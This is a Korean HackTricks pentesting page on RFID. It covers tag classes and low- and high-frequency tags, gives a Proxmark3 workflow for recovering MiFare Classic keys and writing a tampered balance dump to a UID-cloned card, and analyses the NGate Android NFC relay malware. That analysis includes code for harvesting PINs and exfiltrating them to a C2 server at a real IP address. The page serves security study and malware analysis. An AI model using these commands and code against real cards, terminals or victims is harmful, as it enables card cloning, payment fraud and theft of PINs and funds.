# Pentesting RFID

{{#include ../../banners/hacktricks-training.md}}

## 소개

**Radio Frequency Identification (RFID)**는 가장 널리 사용되는 단거리 무선 솔루션입니다. 주로 엔터티를 식별하는 정보를 저장하고 전송하는 데 사용됩니다.

RFID 태그는 **자체 전원( active )**(내장 배터리 등)에 의존할 수 있고, 또는 리더 안테나로부터 수신된 전파에서 **유도된 전류( passive )**로 전원을 공급받을 수 있습니다.

### 클래스

EPCglobal은 RFID 태그를 여섯 개 카테고리로 나눕니다. 각 카테고리의 태그는 이전 카테고리에 있는 모든 기능을 포함하므로 하위 호환됩니다.

- **Class 0** 태그는 **passive**이며 **UHF** 대역에서 동작합니다. 제조사에서 **사전 프로그래밍(preprograms)** 되어 나오므로 메모리에 저장된 정보를 **변경할 수 없습니다**.
- **Class 1** 태그는 **HF** 대역에서도 동작할 수 있습니다. 또한 생산 후 **한 번만 쓰기(write once)**가 가능합니다. 많은 Class 1 태그는 수신한 명령의 **CRC(CRCs)**를 처리할 수 있습니다. CRC는 오류 검출을 위한 명령 끝의 몇 바이트입니다.
- **Class 2** 태그는 **여러 번 기록(write multiple times)**할 수 있습니다.
- **Class 3** 태그는 현재 온도나 태그의 동작과 같은 환경 파라미터를 기록할 수 있는 **내장 센서**를 포함할 수 있습니다. 이러한 태그는 **semi-passive**로, 내장 **배터리** 같은 전원은 있지만 다른 태그나 리더와 무선 통신을 **시작할 수는 없습니다**.
- **Class 4** 태그는 동일 클래스의 다른 태그와 통신을 시작할 수 있어 **active tags**가 됩니다.
- **Class 5** 태그는 **다른 태그에 전원을 공급하고 이전 클래스의 모든 태그와 통신**할 수 있습니다. Class 5 태그는 **RFID readers**로 동작할 수 있습니다.

### RFID 태그에 저장된 정보

RFID 태그의 메모리는 보통 네 가지 종류의 데이터를 저장합니다: 태그가 부착된 엔터티를 **식별하는 식별 데이터(identification data)**(은행 계좌 등 사용자 정의 필드 포함), 엔터티에 대한 **추가 정보(supplementary data)**, 태그 내부 **구성(control data)**에 사용되는 제어 데이터, 그리고 태그의 **제조사 데이터(manufacturer data)**로 UID와 생산, 유형, 벤더 관련 정보를 포함합니다. 상업용 태그에서는 앞의 두 가지 데이터가 거의 모두 존재하며, 마지막 두 가지는 태그 벤더에 따라 다를 수 있습니다.

ISO 표준은 태그가 속한 객체의 **종류**를 나타내는 Application Family Identifier(**AFI**) 값을 지정합니다. ISO가 지정한 또 다른 중요한 레지스터는 사용자 데이터의 **논리적 구성**을 정의하는 Data Storage Format Identifier(**DSFID**)입니다.

대부분의 RFID **보안 제어(security controls)**는 각 사용자 메모리 블록과 AFI 및 DSFID 값을 포함하는 특수 레지스터에 대한 **읽기/쓰기** 작업을 **제한(restrict)**하는 메커니즘을 갖고 있습니다. 이러한 **잠금(lock)** 메커니즘은 제어 메모리에 저장된 데이터를 사용하며 벤더가 미리 설정한 **기본 비밀번호(default passwords)**를 가지고 있지만 태그 소유자가 **커스텀 비밀번호**를 설정할 수 있습니다.

### 저·고주파 태그 비교

<figure><img src="../../images/image (983).png" alt=""><figcaption></figcaption></figure>

## Low-Frequency RFID Tags (125kHz)

**Low-frequency tags**는 보안이 크게 필요하지 않은 시스템에서 자주 사용됩니다: 건물 출입, 인터콤 키, 헬스클럽 멤버십 카드 등. 더 긴 작동 거리로 인해 유료 주차 시스템에 편리하게 사용됩니다: 운전자가 카드 를 리더 가까이 가져갈 필요 없이 먼 거리에서 트리거됩니다. 반면 저주파 태그는 매우 원시적이고 데이터 전송 속도가 낮아 잔액 관리나 암호화 같은 복잡한 양방향 데이터 전송을 구현할 수 없습니다. 저주파 태그는 인증 수단 없이 짧은 ID만 전송합니다.

이 장치들은 **passive RFID** 기술에 의존하며 **30 kHz ~ 300 kHz** 범위에서 동작하지만, 보통은 **125 kHz ~ 134 kHz**를 사용합니다:

- **Long Range** — 낮은 주파수는 더 긴 범위를 의미합니다. 일부 EM-Marin 및 HID 리더는 최대 1미터 거리에서 동작합니다. 주차 시스템 등에 자주 사용됩니다.
- **Primitive protocol** — 낮은 데이터 전송 속도로 인해 이러한 태그는 짧은 ID만 전송할 수 있습니다. 대부분의 경우 데이터는 인증되지 않으며 어떠한 보호도 없습니다. 카드가 리더 범위에 들어가면 단순히 ID를 전송합니다.
- **Low security** — 이 카드들은 프로토콜의 원시성 때문에 쉽게 복제되거나 다른 사람의 주머니에서도 읽힐 수 있습니다.

Popular 125 kHz protocols:

- **EM-Marin** — EM4100, EM4102. CIS 지역에서 가장 인기 있는 프로토콜입니다. 단순성과 안정성 때문에 약 1미터 거리에서 읽을 수 있습니다.
- **HID Prox II** — HID Global이 도입한 저주파 프로토콜입니다. 서구권에서 더 인기가 많습니다. 더 복잡하며 이 프로토콜용 카드와 리더는 상대적으로 비쌉니다.
- **Indala** — Motorola가 도입하고 나중에 HID가 인수한 오래된 저주파 프로토콜입니다. 앞의 두 프로토콜보다 사용 빈도가 줄어들고 있습니다.

실제로 저주파 프로토콜은 훨씬 더 많지만, 물리 계층에서 동일한 변조를 사용하므로 위에 열거된 프로토콜의 변형으로 간주될 수 있습니다.

### 공격

이 태그들은 Flipper Zero로 공격할 수 있습니다:


{{#ref}}
flipper-zero/fz-125khz-rfid.md
{{#endref}}

## High-Frequency RFID Tags (13.56 MHz)

**High-frequency tags**는 암호화, 대용량 양방향 데이터 전송, 인증 등 복잡한 리더-태그 상호작용이 필요할 때 사용됩니다. 주로 은행 카드, 대중교통, 기타 보안 패스에서 볼 수 있습니다.

**High-frequency 13.56 MHz tags are a set of standards and protocols**. 이들을 보통 [NFC](https://nfc-forum.org/what-is-nfc/about-the-technology/)라고 부르지만 항상 정확한 표현은 아닙니다. 물리 및 논리 레벨에서 사용되는 기본 프로토콜 세트는 ISO 14443입니다. 상위 수준의 프로토콜과 대체 표준(예: ISO 19092)은 이를 기반으로 합니다. 많은 사람들이 이 기술을 13.56 MHz 대역에서 동작하는 기기를 가리키는 용어인 **NFC**(Near Field Communication)로 부릅니다.

<figure><img src="../../images/image (930).png" alt=""><figcaption></figcaption></figure>

간단히 말하면, NFC의 아키텍처는 다음과 같습니다: 전송 프로토콜은 카드를 만드는 회사가 선택하여 저수준 ISO 14443를 기반으로 구현합니다. 예를 들어 NXP는 자체 고수준 전송 프로토콜인 Mifare를 만들었지만, 저수준에서는 Mifare 카드가 ISO 14443-A 표준을 기반으로 합니다.

Flipper는 저수준 ISO 14443 프로토콜과 Mifare Ultralight 데이터 전송 프로토콜 및 은행 카드에 사용되는 EMV와 상호작용할 수 있습니다. 우리는 Mifare Classic과 NFC NDEF 지원을 추가하기 위해 작업 중입니다. NFC를 구성하는 프로토콜과 표준을 철저히 살펴보는 것은 별도의 기사로 다룰 가치가 있으며 추후 게시할 예정입니다.

ISO 14443-A 표준을 기반으로 한 모든 고주파 카드는 고유한 칩 ID를 가집니다. 이는 네트워크 카드의 MAC 주소처럼 카드의 일련번호 역할을 합니다. **대부분 UID는 4바이트 또는 7바이트 길이**이지만 드물게 **최대 10바이트**까지 갈 수 있습니다. UID는 비밀이 아니며 쉽게 읽을 수 있고, **때로는 카드 자체에 인쇄되어 있기도 합니다**.

많은 출입 통제 시스템이 UID에 의존하여 **인증 및 접근 허가**를 수행합니다. 때로는 RFID 태그가 암호화를 지원하더라도 UID만으로 접근을 허용하는 사례가 있습니다. 이런 **오용**은 보안 면에서 해당 시스템을 단순한 **125 kHz 카드** 수준으로 끌어내립니다. 가상 카드(예: Apple Pay)는 동적 UID를 사용하여 전화 사용자가 결제 앱으로 문을 열 수 없게 합니다.

- **Low range** — 고주파 카드는 리더에 가까이 가져가야만 동작하도록 설계되어 있습니다. 이는 무단 상호작용으로부터 카드를 보호하는 데 도움이 됩니다. 우리가 달성한 최대 읽기 거리는 약 15 cm였고, 이는 맞춤 제작된 장거리 리더를 사용했을 때입니다.
- **Advanced protocols** — 최대 424 kbps의 데이터 전송 속도로 복잡한 프로토콜과 완전한 양방향 데이터 전송이 가능합니다. 이는 암호화나 데이터 전송 등을 **가능하게 합니다**.
- **High security** — 고주파 비접촉 카드의 보안성은 스마트 카드와 비교해 전혀 뒤처지지 않습니다. AES 같은 강력한 암호 알고리즘을 지원하고 비대칭 암호화를 구현하는 카드도 있습니다.

### 공격

이 태그들은 Flipper Zero로 공격할 수 있습니다:


{{#ref}}
flipper-zero/fz-nfc.md
{{#endref}}

또는 **proxmark**를 사용하여 다음과 같이 공격할 수 있습니다:


{{#ref}}
proxmark-3.md
{{#endref}}

### MiFare Classic offline stored-value tampering (broken Crypto1)

시스템이 MiFare Classic 카드에 금전 잔액을 직접 저장할 경우, Classic이 NXP의 더 이상 권장되지 않는 Crypto1 암호를 사용하기 때문에 종종 조작할 수 있습니다. Crypto1은 수년 전부터 깨져 왔으며, sector keys 복구와 카드 메모리의 전체 읽기/쓰기를 일반 하드웨어(예: Proxmark3)로 수행할 수 있게 합니다.

엔드투엔드 워크플로우(요약):

1) 원본 카드를 덤프하고 키를 복구
```bash
# Attempt all built-in Classic key recovery attacks and dump the card
hf mf autopwn
```
이는 일반적으로 sector keys (A/B)를 복구하고 client dumps folder에 full-card dump를 생성합니다.

2) 값/무결성 필드를 찾고 이해하기

- 원본 카드에 합법적인 top-ups을 수행하고 여러 번의 dumps(충전 전/후)를 얻습니다.
- 두 dumps의 diff를 수행하여 잔액과 무결성 필드를 나타내는 변경되는 블록/bytes를 식별합니다.
- 많은 Classic 배포에서는 기본 "value block" 인코딩을 사용하거나 자체 체크섬을 적용합니다(예: 잔액과 다른 필드 및 상수의 XOR). 잔액을 변경한 후에는 무결성 bytes를 재계산하고, 중복되거나 보완된 모든 필드가 일관되도록 확인하세요.

3) 수정된 modified dump를 쓰기 가능한 “Chinese magic” Classic tag에 기록합니다.
```bash
# Load a modified binary dump onto a UID-changeable Classic tag
hf mf cload -f modified.bin
```
4) 원래 UID를 복제하여 단말기가 카드를 인식하도록 한다
```bash
# Set the UID on a UID-changeable tag (gen1a/gen2 magic)
hf mf csetuid -u <original_uid>
```
5) 단말기에서 사용

카드 자체의 잔액(on-card balance)과 UID를 신뢰하는 리더는 조작된 카드를 수락한다. 현장 관찰에 따르면 많은 배포 환경에서 필드 너비(예: 16비트 fixed-point)에 따라 잔액을 제한한다.

Notes

- 시스템이 native Classic value blocks를 사용한다면 형식을 기억하라: value (4B) + ~value (4B) + value (4B) + block address + ~address. 모든 부분이 일치해야 한다.
- 간단한 체크섬을 사용하는 커스텀 포맷의 경우, 펌웨어를 리버스하지 않고 무결성 함수를 도출하는 가장 빠른 방법은 차분 분석(differential analysis)이다.
- block 0/UID 쓰기를 허용하는 것은 UID-changeable 태그(예: "Chinese magic" gen1a/gen2)뿐이다. 일반 Classic 카드는 UID가 읽기 전용이다.

실습용 Proxmark3 명령은 다음을 참조:

{{#ref}}
proxmark-3.md
{{#endref}}

### 휴대용 HID MaxiProx 125 kHz Mobile Cloner 제작

레드팀 활동 중 HID Prox® 배지를 수집하기 위한 **장거리**, **배터리 구동** 솔루션이 필요하다면 벽걸이형 **HID MaxiProx 5375** 리더를 백팩에 들어가는 자급식 클로너로 개조할 수 있다. 전체 기계적·전기적 워크스루는 다음을 참조:

{{#ref}}
maxiprox-mobile-cloner.md
{{#endref}}

## Android Reader↔HCE Emitter를 통한 NFC/EMV 릴레이

Classic EMV 릴레이는 2대의 Android 디바이스로 구현할 수 있다: 실제 카드에서 라이브 APDUs와 PIN을 캡처하는 victim 측 리더, 그리고 단말기에서 APDUs를 상위로 전달하는 attacker 측 HCE emitter. 분석된 NGate 키트는 정당한 Android NFC API와 단순한 프레임 기반 TCP C2를 악용해 실시간 ATM 캐시아웃을 조율한다.

핵심 구성 요소

- Reader-mode app (victim): NFC reader APIs를 사용해 EMV (PAN/expiry/AIDs)를 파싱하고, AID별로 스킴을 표시하며 PIN을 요청해 즉시 유출(exfiltrate)한다.
- Emitter-mode app (ATM side): Host Card Emulation (HCE)을 구현하며 `android:requireDeviceUnlock="false"`와 결제 AID를 사용한다; `processCommandApdu()`는 APDUs를 C2로 전달하고 최소한의 응답을 반환한다.
- Wire protocol: length-prefixed frames, 주기적 keepalive; 선택적으로 TLS.

Android surface (Manifest/HCE)
```xml
<uses-permission android:name="android.permission.NFC"/>
<uses-permission android:name="android.permission.INTERNET"/>
<service android:name=".nfc.hce.ApduService"
android:permission="android.permission.BIND_NFC_SERVICE"
android:exported="true">
<intent-filter>
<action android:name="android.nfc.cardemulation.action.HOST_APDU_SERVICE"/>
<category android:name="android.intent.category.DEFAULT"/>
</intent-filter>
<meta-data android:name="android.nfc.cardemulation.host_apdu_service"
android:resource="@xml/hce"/>
</service>
```
hce.xml 예시 (잠금 해제 없음 + 결제 AID)
```xml
<host-apdu-service android:requireDeviceUnlock="false"
android:description="relay">
<aid-group android:category="other">
<aid-filter android:name="F001020304050607"/>
</aid-group>
<aid-group android:category="payment">
<aid-filter android:name="F001020304050607"/>
</aid-group>
</host-apdu-service>
```
투명 중계 엔드포인트 (HCE)
```java
@Override public byte[] processCommandApdu(byte[] apdu, Bundle extras) {
Log.d("ApduService", "APDU-IN: " + toHex(apdu));
bus.forward(apdu); // send upstream to C2/reader
return new byte[0]; // empty response, pure relay endpoint
}
```
AID로 EMV 스킴 유추 (예시)

- A000000004 → Mastercard
- A000000003 → Visa
- A000000658 → MIR
- A000000333 → UnionPay

PIN harvesting 패턴 (피해자 UI)
```java
// Custom keypad publishes when required length (e.g., 4) is reached
if (pin.length() == 4) postDelayed(() -> bus.publish(pin), 100L);
// Network immediately exfiltrates via dedicated opcode
send(OP_PIN_REQ, pin.getBytes(StandardCharsets.UTF_8));
```
Framed C2 (cleartext 예시)

- Client→Server: int32 len | int32 opcode | body
- Server→Client: int32 len | body (opcode inside payload)
- 본문 크기가 ~100 MiB를 초과하면 거부; keepalive ~7s (PING)
```java
// send
out.writeInt(body.length); out.writeInt(op); out.write(body); out.flush();
// recv
int len = in.readInt(); byte[] body = new byte[len]; in.readFully(body);
```
Config concealment: 인증서 기반 XOR

- 네이티브 라이브러리는 앱 서명 인증서(DER)의 SHA‑256으로 32-byte 키를 유도한다.
- C2 구성은 assets(예: `assets/____`)에 ASCII‑hex로 저장되어 있으며, hex-decoded된 뒤 키를 32 bytes마다 반복해 XOR-ed된다:
```c
for (size_t i = 0; i < len; i++) pt[i] = ct[i] ^ key[i & 31];
```
config를 decrypt하기 위한 오프라인 PoC
```bash
# Extract signing cert digest
apksigner verify --print-certs sample.apk
# "Signer #1 certificate SHA-256 digest: <hex>"
```

```python
import pathlib
key = bytes.fromhex("<sha256_of_signing_cert>")
ct  = bytes.fromhex(pathlib.Path("/path/to/assets/____").read_text().strip())
pt  = bytes(c ^ key[i % 32] for i, c in enumerate(ct))
print(pt.decode("utf-8", errors="replace"))
```
샘플 복호화된 필드: `host`, `port`, `sharedToken`, `tls`, `mode`, `reader`, `uniqueID`, `ttd`.

릴레이 체인 (end-to-end)

1) 피해자가 APK를 설치하고 앱을 열면 → native init이 assets에서 config를 복호화함.  
2) 앱이 framed TCP를 사용해 C2(예: `91.84.97.13:5653`)에 연결함; keepalive 약 7초.  
3) 피해자가 카드를 태그하면 → reader가 PAN/expiry/AIDs를 추출하고 CARD_DISCOVERED를 전송함.  
4) 피해자가 PIN을 입력하면 → keypad가 PIN_REQ로 게시하고 exfiltrate함; 서버는 UI용으로만 VALID/INVALID로 응답함.  
5) 터미널의 공격자 장치는 HCE emitter를 실행하여 APDUs를 ATM으로 릴레이하고 cash-out을 수행함.

---

## 참고자료

- [https://blog.flipperzero.one/rfid/](https://blog.flipperzero.one/rfid/)
- [Let's Clone a Cloner – Part 3 (TrustedSec)](https://trustedsec.com/blog/lets-clone-a-cloner-part-3-putting-it-all-together)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [MIFARE security overview (Wikipedia)](https://en.wikipedia.org/wiki/MIFARE#Security)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [Analysis of NGate malware campaign (CERT-PL)](https://cert.pl/en/posts/2025/11/analiza-ngate/)
- [Android apksigner – verify/print-certs](https://developer.android.com/studio/command-line/apksigner)
- [Android Host Card Emulation (HCE) overview](https://developer.android.com/guide/topics/connectivity/nfc/hce)

{{#include ../../banners/hacktricks-training.md}}
